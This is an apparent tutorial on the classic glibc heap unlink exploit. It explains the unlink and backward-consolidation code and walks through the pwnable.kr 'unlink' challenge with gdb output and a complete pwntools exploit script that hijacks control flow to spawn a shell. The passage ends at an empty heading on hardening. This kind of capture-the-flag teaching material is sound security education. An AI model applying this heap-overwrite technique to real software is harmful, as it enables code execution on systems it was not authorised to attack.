# Unlink Exploit

The unlink exploit [Phrack \#57](http://www.phrack.org/issues/57/8.html#article)

In the unlink exploit, the goal is to exploit the following macro:

```c
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");                              \
    FD = P->fd;                                                                      \
    BK = P->bk;                                                                      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
      malloc_printerr ("corrupted double-linked list");                              \
    else {                                                                      \
        FD->bk = BK;                                                              \
        BK->fd = FD;                                                              \
        if (!in_smallbin_range (chunksize_nomask (P))                              \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {                      \
            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {                                      \
                if (P->fd_nextsize == P)                                      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;                      \
                else {                                                              \
                    FD->fd_nextsize = P->fd_nextsize;                              \
                    FD->bk_nextsize = P->bk_nextsize;                              \
                    P->fd_nextsize->bk_nextsize = FD;                              \
                    P->bk_nextsize->fd_nextsize = FD;                              \
                  }                                                              \
              } else {                                                              \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;                      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;                      \
              }                                                                      \
          }                                                                      \
      }                                                                              \
}
```

The unlink macro removes a chunk from a bin.  

```c
FD->bk = BK;                                                              \
BK->fd = FD;
```

#### Consolidate Backwards

glibc likes to keep the heap tidy, as I've been told, so if two adjacent chunks in memory are both free, why not merge them?  This action happens through the previous inuse bit set within a chunk.  If a chunk has it's previous inuse bit set, then it will consolidate them through the following action.

```c
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
```

```c
    /* consolidate backward */
    // Is the previous chunk free?
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
       // add previous chunk size to current size
      size += prevsize;
       // move data pointer back to merge both chunks
       // i.e. change chunk pointer to point to current chunk
      p = chunk_at_offset(p, -((long) prevsize));
      // unlink from from the bin
      
      unlink(av, p, bck, fwd);
    }
```

This chunk is then placed within the unsorted chunk list, as it is given a chance to be re-allocated before being placed in a regular bin, but that's not as important to the crux of the exploit.  

## Example 1: pwnable.kr

This used to be much easier to exploit, but due to glibc hardening it's much more difficult.  Firstly, I'll walk through an example from pwnable.kr which will allow us to demonstrate the prior behaviour.  This implements a custom unlink method.  Since this doesn't contain the hardening done by glibc, it makes it much easier to show how this was done originally. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

We have the stack and heap addresses, so ASLR is no longer an issue.  In this the data being passed into A is not bounds checked, so we need to write a fake chunk into A, and overwrite the fd and bk pointers in B.  

```text
(gdb) r
Starting program: /home/unlink/unlink 
here is stack address leak: 0xffb07fe4
here is heap address leak: 0x91ae410
now that you have leaks, get shell!
```

```text
(gdb) p shell
$2 = {<text variable, no debug info>} 0x80484eb <shell>
```

```text
(gdb) x/20x 0xffb07fe4
0xffb07fe4:	0x091ae410	0x091ae440	0x091ae428	0xf776e3dc
0xffb07ff4:	0xffb08010	0x00000000	0xf75d7637	0xf776e000
0xffb08004:	0xf776e000	0x00000000	0xf75d7637	0x00000001
0xffb08014:	0xffb080a4	0xffb080ac	0x00000000	0x00000000
0xffb08024:	0x00000000	0xf776e000	0xf77a6c04	0xf77a6000
(gdb) info frame
Stack level 0, frame at 0xffb07f08:
 eip = 0xf7780c99 in __kernel_vsyscall; saved eip = 0xf7693443
 called by frame at 0xffb07f10
 Arglist at 0xffb07f00, args: 
 Locals at 0xffb07f00, Previous frame's sp is 0xffb07f08
 Saved registers:
  ecx at 0xffb07f00, edx at 0xffb07efc, ebp at 0xffb07ef8, eip at 0xffb07f04
```

```text
(gdb) p -0xffb07f04+0xffb07fe4
$4 = 224
```

```text
(gdb) x/6x 0x91ae410   <==== A
0x91ae410:	0x091ae428	0x00000000	0x00000000	0x00000000
0x91ae420:	0x00000000	0x00000019
(gdb) x/6x 0x91ae410+4*6 <====== B
0x91ae428:	0x091ae440	0x091ae410	0x00000000	0x00000000
0x91ae438:	0x00000000	0x00000019
```

Since it exits immediately after we're going to want to overwrite eip, which we can calculate from the stack leak.

We only need to do a 4-byte overwrite into the B struct as we'll just overwrite fwd

```text
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;
```

By overwriting fd with EIP:

```text
FD->bk=BK;
BK->fd=FD;
```

So we need to write to fill the current allocation plus 4 bytes which will be the address of EIP-4.

```python
from pwn import *
s=ssh(host='pwnable.kr' ,port=2222,  user='unlink', password='guest')

r = s.process('./unlink')
r.recvuntil(' stack address leak: ')
stack = r.recvline()
r.recvuntil(' heap address leak: ')
heap = r.recvline()

print stack
print heap

ebp = int(stack, 0) - 0x20
heap = int(heap,0)
shell = 0x80484eb

payload = p32(shell)
payload += p32(heap+12)
payload += p32(0x19)
payload += p32(0x19)
payload += p32(ebp) #fd
payload += p32(heap+16) #bk

r.sendafter(' get shell!', payload)
r.interactive()
```

## Modern Hardening Measures



